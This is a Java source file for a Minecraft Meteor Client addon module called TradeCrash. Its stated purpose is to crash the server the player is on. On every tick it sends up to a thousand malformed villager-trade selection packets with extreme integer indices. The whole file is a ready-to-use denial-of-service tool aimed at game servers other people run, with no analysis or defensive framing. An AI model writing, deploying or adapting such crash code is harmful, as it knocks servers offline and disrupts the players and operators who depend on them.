package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.SelectMerchantTradeC2SPacket;

public class TradeCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build()
    );

    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which type of packet to send.")
            .defaultValue(Modes.MIN)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
    );

    public TradeCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "trade-crash", "CRYSTAL || Attempts to crash the server you are on by sending broken villager trading packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        switch (mode.get()) {
            case MIN -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(Integer.MIN_VALUE));
            }
            case MAX -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(Integer.MAX_VALUE));
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Modes {
        MIN,
        MAX
    }
}